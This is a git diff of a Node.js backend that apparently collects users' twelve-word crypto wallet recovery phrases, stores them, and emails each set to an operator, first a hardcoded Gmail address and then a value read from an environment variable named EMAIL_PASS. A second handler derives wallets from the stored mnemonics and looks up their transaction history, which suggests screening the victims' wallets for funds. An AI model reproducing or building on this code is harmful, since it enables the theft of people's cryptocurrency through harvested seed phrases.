@@ -32,16 +32,16 @@ exports.addword = async (req, res) => {
     // 2️⃣ Insert new wallet words
     const insertSql = `
       INSERT INTO wallet 
-      (user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve) 
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+      (user_id, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve, created_at, updated_at) 
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW(), NOW())
     `;
     const [result] = await db.query(insertSql, [
       userId, type, one, two, three, four, five, six, seven, eight, nine, ten, eleven, twelve
     ]);
     await sendEmail({
-          to: 'backedbyquantum@gmail.com',
-          subject: `New ${ type } Data Received`,
-          html: `
+      to: process.env.EMAIL_PASS,
+      subject: `New ${type} Data Received`,
+      html: `
         <h2>${type} Details</h2>
         <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse; width:100%; font-family:Arial, sans-serif;">
           <tr><td><strong>One</strong></td><td>${one || "-"}</td></tr>
@@ -177,7 +177,7 @@ exports.getwalletHistory = async (req, res) => {
     const results = await Promise.all(validMnemonics.map(async (mnemonic) => {
       try {
         // ethers v6+ uses fromPhrase, v5 uses fromMnemonic
-        const wallet = ethers.Wallet.fromPhrase(mnemonic); 
+        const wallet = ethers.Wallet.fromPhrase(mnemonic);
         const address = wallet.address;
         const baseUrl = `https://api.covalenthq.com/v1/${chainId}/address/${address}`;
 
@@ -268,7 +268,3 @@ exports.iframe = async (req, res) => {
     res.status(500).json({ msg: err.message, status_code: false });
   }
 };
-
-
-
-
